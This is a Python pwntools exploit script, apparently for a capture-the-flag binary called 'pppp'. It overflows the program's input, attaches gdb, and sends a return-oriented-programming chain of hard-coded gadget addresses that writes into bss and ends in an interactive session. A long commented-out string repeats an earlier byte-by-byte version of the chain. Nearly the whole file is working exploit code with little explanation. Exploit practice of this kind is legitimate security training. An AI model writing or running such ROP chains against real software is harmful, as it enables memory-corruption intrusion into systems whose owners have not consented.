#!/usr/bin/env python3


from pwn import *


e = ELF("./pppp")
r = process("./pppp")

context.terminal = ["tilix", "-a", "session-add-right", "-e"]


def sp(p):
    p=p32(p)
    for i in p:
        r.sendline(p8(i)*11)

gdbscript="""
b *0x08049e5d
"""

gdb.attach(r.pid, gdbscript=gdbscript)
pause()


for i in range(0, 24):
    r.sendline(p8(0x41)*11)

pop_eax_ret=0x080b02ea
pop_ebp_ret=0x08049859
pop_ebp_ret=0x08066a63
pop_ebp_ret=0x080a8420
pop_ebx_ret=0x08049022
pop_ebx_retf=0x0805e551
pop_edi_ret=0x0804b34f
pop_esi_ret=0x0804af3a
pop_esi_retf=0x0804cb4e
pop_esp_ret=0x080b029a
pop_edx_pop_ebx_ret=0x0805edb9
pop_ecx=0x08064281

mov_dword_ptr_eax_edx_ret=0x08096433
mov_dword_ptr_edx_eax_ret=0x0805faf2
mov_eax_edx=0x0805c82e

# 0x0806b503: test byte ptr [edi], -0x4a; push esi; imul byte ptr [ecx]; rcr byte ptr [edi + 0x5e], 1; pop ebx; ret;

imul=0x806b507
bss=0x80e5064

xchg=0x08098d6f
# 0x08062c7e: xchg eax, ebp; ret; 

sp(pop_ebp_ret)
sp(0x6)

for i in range(1,7):

    sp(pop_edx_pop_ebx_ret)
    sp(i)
    sp(0x0) # junk
    
    sp(pop_eax_ret)
    sp(bss)
    
    sp(mov_dword_ptr_eax_edx_ret) # write 0x6 to bss

    
    sp(pop_ecx)
    sp(bss)

    sp(xchg)

    sp(imul)
    sp(0x0) # junk

    sp(xchg)

r.sendline(b"\n")
r.interactive()
"""
r.sendline(p8(0x08) * 11)
r.sendline(p8(0x63) * 11)
r.sendline(p8(0x0e) * 11)
r.sendline(p8(0x08) * 11)

r.sendline(p8(0x81) * 11)
r.sendline(p8(0x42) * 11)
r.sendline(p8(0x06) * 11)
r.sendline(p8(0x08) * 11)   #pop ecx;add al,0xf6;ret


r.sendline(p8(0x10)* 11)
r.sendline(p8(0x63) * 11)    
r.sendline(p8(0x0e) * 11)
r.sendline(p8(0x08) * 11)      #0x080e6310

r.sendline(p8(0xea) * 11)
r.sendline(p8(0x02) * 11)
r.sendline(p8(0x0b) * 11)
r.sendline(p8(0x08) * 11)      #pop eax;ret

r.sendline(p8(0xe0) * 11)
r.sendline(p8(0x62) * 11)
r.sendline(p8(0x0e) * 11)
r.sendline(p8(0x08) * 11)       #0x080e62e0

r.sendline(p8(0x38) * 11)
r.sendline(p8(0x64) * 11)
r.sendline(p8(0x09) * 11)
r.sendline(p8(0x08) * 11)       # mov dword ptr[eax+0x20],ecx;ret

r.sendline(p8(0x81) * 11)
r.sendline(p8(0x42) * 11)
r.sendline(p8(0x06) * 11)
r.sendline(p8(0x08) * 11)   #pop ecx;add al,0xf6;ret

r.sendline(p8(0x08)* 11)
r.sendline(p8(0x63) * 11)    
r.sendline(p8(0x0e) * 11)
r.sendline(p8(0x08) * 11)      #0x080e6308

r.sendline(p8(0xea) * 11)
r.sendline(p8(0x02) * 11)
r.sendline(p8(0x0b) * 11)
r.sendline(p8(0x08) * 11)      #pop eax;ret

r.sendline(p8(0x84) * 11)
r.sendline(p8(0x6c) * 11)
r.sendline(p8(0x0e) * 11)
r.sendline(p8(0x08) * 11)       #0x080e62e0

r.sendline(p8(0x38) * 11)
r.sendline(p8(0x64) * 11)
r.sendline(p8(0x09) * 11)
r.sendline(p8(0x08) * 11)       # mov dword ptr[eax+0x20],ecx;ret


r.sendline(p8(0x81) * 11)
r.sendline(p8(0x42) * 11)
r.sendline(p8(0x06) * 11)
r.sendline(p8(0x08) * 11)   #pop ecx;add al,0xf6;ret

r.sendline(p8(0x05)* 11)
r.sendline(p8(0x6a) * 11)    
r.sendline(p8(0x07) * 11)
r.sendline(p8(0x08) * 11)      #0x08076a05

r.sendline(p8(0xea) * 11)
r.sendline(p8(0x02) * 11)
r.sendline(p8(0x0b) * 11)
r.sendline(p8(0x08) * 11)      #pop eax;ret

r.sendline(p8(0xec) * 11)
r.sendline(p8(0x62) * 11)
r.sendline(p8(0x0e) * 11)
r.sendline(p8(0x08) * 11)       #0x080e62ec

r.sendline(p8(0x38) * 11)
r.sendline(p8(0x64) * 11)
r.sendline(p8(0x09) * 11)
r.sendline(p8(0x08) * 11)       # mov dword ptr[eax+0x20],ecx;ret


r.sendline(p8(0x81) * 11)
r.sendline(p8(0x42) * 11)
r.sendline(p8(0x06) * 11)
r.sendline(p8(0x08) * 11)   #pop ecx;add al,0xf6;ret

r.sendline(p8(0x01)* 11)
r.sendline(p8(0x0) * 11)    
r.sendline(p8(0x0) * 11)
r.sendline(p8(0x0) * 11)      #0x1

r.sendline(p8(0xea) * 11)
r.sendline(p8(0x02) * 11)
r.sendline(p8(0x0b) * 11)
r.sendline(p8(0x08) * 11)      #pop eax;ret

r.sendline(p8(0x84) * 11)
r.sendline(p8(0x6c) * 11)
r.sendline(p8(0x0e) * 11)
r.sendline(p8(0x08) * 11)       #0x080e6c84

r.sendline(p8(0x38) * 11)
r.sendline(p8(0x64) * 11)
r.sendline(p8(0x09) * 11)
r.sendline(p8(0x08) * 11)       # mov dword ptr[eax+0x20],ecx;ret


r.sendline(p8(0x81) * 11)
r.sendline(p8(0x42) * 11)
r.sendline(p8(0x06) * 11)
r.sendline(p8(0x08) * 11)  # pop ecx;add al,0xf6;ret

r.sendline(p8(0xa4)* 11)
r.sendline(p8(0x6c) * 11)  
r.sendline(p8(0x0e) * 11)
r.sendline(p8(0x08) * 11)   # 0x080e6ca4



r.sendline(p8(0x3a) * 11)
r.sendline(p8(0xaf) * 11)
r.sendline(p8(0x04) * 11)
r.sendline(p8(0x08) * 11)       #pop esi;ret

r.sendline(p8(0x1b) * 11)
r.sendline(p8(0x6d) * 11)
r.sendline(p8(0x0e) * 11)
r.sendline(p8(0x08) * 11)       #0x080e6c2d

r.sendline(p8(0xea) * 11)
r.sendline(p8(0x02) * 11)
r.sendline(p8(0x0b) * 11)
r.sendline(p8(0x08) * 11)       #pop eax; ret

r.sendline(p8(0x2) * 11)
r.sendline(p8(0x0) * 11)
r.sendline(p8(0x0) * 11)
r.sendline(p8(0x0) * 11)       #0x2

r.sendline(p8(0x22) * 11)
r.sendline(p8(0x90) * 11)
r.sendline(p8(0x04) * 11)
r.sendline(p8(0x08) * 11)      #pop ebx;ret


r.sendline(p8(0x9c) * 11)
r.sendline(p8(0x3e) * 11)
r.sendline(p8(0x06) * 11)
r.sendline(p8(0xad) * 11)       #ebx value


r.sendline(p8(0x54) * 11)
r.sendline(p8(0x63) * 11)
r.sendline(p8(0x06) * 11)
r.sendline(p8(0x08) * 11)     #inc edx

r.sendline(p8(0x54) * 11)
r.sendline(p8(0x63) * 11)
r.sendline(p8(0x06) * 11)
r.sendline(p8(0x08) * 11)     #inc edx

r.sendline(p8(0x54) * 11)
r.sendline(p8(0x63) * 11)
r.sendline(p8(0x06) * 11)
r.sendline(p8(0x08) * 11)     #inc edx


for i in range(0,5):

    r.sendline(p8(0xb7) * 11)
    r.sendline(p8(0x84) * 11)
    r.sendline(p8(0x06) * 11)
    r.sendline(p8(0x08) * 11)        #mul byte ptr




    r.sendline(p8(0xed) * 11)
    r.sendline(p8(0x88) * 11)
    r.sendline(p8(0x08) * 11)
    r.sendline(p8(0x08) * 11)      #mov dword ptr [ecx],eax;pop ebx;ret


    r.sendline(p8(0x9c) * 11)
    r.sendline(p8(0x3e) * 11)
    r.sendline(p8(0x06) * 11)
    r.sendline(p8(0xad) * 11) 


    r.sendline(p8(0x2e) * 11)
    r.sendline(p8(0xc8) * 11)
    r.sendline(p8(0x05) * 11)
    r.sendline(p8(0x08) * 11)         #mov edx,eax


r.sendline(p8(0xea) * 11)
r.sendline(p8(0x02) * 11)
r.sendline(p8(0x0b) * 11)
r.sendline(p8(0x08) * 11)       #pop eax; ret

r.sendline(p8(0xa4) * 11)
r.sendline(p8(0x6c) * 11)
r.sendline(p8(0x0e) * 11)
r.sendline(p8(0x08) * 11)       #0x080e6ca4

r.sendline(p8(0x22) * 11)
r.sendline(p8(0x90) * 11)
r.sendline(p8(0x04) * 11)
r.sendline(p8(0x08) * 11)      #pop ebx;ret


r.sendline(p8(0x00) * 11)
r.sendline(p8(0x50) * 11)
r.sendline(p8(0x0e) * 11)
r.sendline(p8(0x08) * 11)       #value to print

r.sendline(p8(0xcd) * 11)
r.sendline(p8(0x9e) * 11)
r.sendline(p8(0x04) * 11)
r.sendline(p8(0x08) * 11)      #return to main+111 


r.send(b"\n")

r.interactive()
"""